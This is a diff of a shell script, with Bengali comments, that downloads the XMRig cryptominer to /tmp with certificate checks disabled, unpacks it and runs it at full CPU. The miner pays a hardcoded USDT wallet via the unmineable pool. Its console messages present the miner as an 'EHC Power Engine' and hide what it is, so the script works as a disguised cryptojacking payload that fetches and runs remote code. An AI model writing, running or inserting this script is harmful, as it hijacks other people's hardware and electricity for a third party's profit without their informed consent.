@@ -25,15 +25,23 @@ echo "-> RAM Size  : ${RAM_INFO}MB"
 echo "-> Local IP  : $IP_INFO"
 echo "--------------------------------------------------"
 
-# ৩. গিটহাব থেকে সরাসরি স্ট্যাটিক XMRig ডাউনলোড করা
+# ৩. ডাউনলোড ও ফোল্ডার প্রিপারেশন
 echo "[+] Downloading EHC Power Engine..."
-wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-static-x64.tar.gz -O /tmp/xmrig.tar.gz
-tar -xf /tmp/xmrig.tar.gz -C /tmp/
+mkdir -p /tmp/ehc_engine
+wget --no-check-certificate -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-static-x64.tar.gz -O /tmp/ehc_engine/xmrig.tar.gz
+
+if [ -f /tmp/ehc_engine/xmrig.tar.gz ]; then
+    tar -xf /tmp/ehc_engine/xmrig.tar.gz -C /tmp/ehc_engine/
+fi
 
 echo "--------------------------------------------------"
 echo "[+] EHC CoreGrid Engine is running at 100% Power..."
 echo "[+] Wallet: 0xD6d0c99C1241A175f403d758280F71Ca5aBd2c92"
 echo "--------------------------------------------------"
 
-# ৪. আপনার ওয়ালেট এবং ডাইনামিক ওয়ার্কার নাম দিয়ে ইঞ্জিন ব্যাকগ্রাউন্ডে রান করা
-/tmp/xmrig-6.21.0/xmrig -o rx.unmineable.com:3333 -u USDT:0xD6d0c99C1241A175f403d758280F71Ca5aBd2c92.$WORKER_NAME#referral -p x --threads=$CPU_INFO --huge-pages
+# ৪. ইঞ্জিন রান করা
+if [ -f /tmp/ehc_engine/xmrig-6.21.0/xmrig ]; then
+    /tmp/ehc_engine/xmrig-6.21.0/xmrig -o rx.unmineable.com:3333 -u USDT:0xD6d0c99C1241A175f403d758280F71Ca5aBd2c92.$WORKER_NAME#referral -p x --threads=$CPU_INFO --huge-pages
+else
+    echo "[!] Download failed or incompatible environment. Real hardware required."
+fi
